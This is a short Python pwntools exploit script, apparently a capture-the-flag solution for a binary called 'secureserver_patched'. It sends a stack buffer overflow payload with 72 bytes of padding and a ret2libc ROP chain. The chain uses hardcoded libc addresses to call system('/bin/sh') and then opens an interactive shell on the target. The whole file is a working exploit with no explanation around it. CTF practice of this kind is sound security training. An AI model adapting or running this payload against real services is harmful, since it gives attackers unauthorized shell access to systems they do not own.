#!/usr/bin/env python3

from pwn import *

exe = ELF("./secureserver_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    libcbase = 0x7ffff7dbd000
    system = libcbase + 0x50050
    binsh = libcbase + 0x19ce43
    r.sendlineafter(b':', b'A'*72 + p64(0x401016) + p64(0x40120b) + p64(binsh) + p64(system))
    r.interactive()


if __name__ == "__main__":
    main()
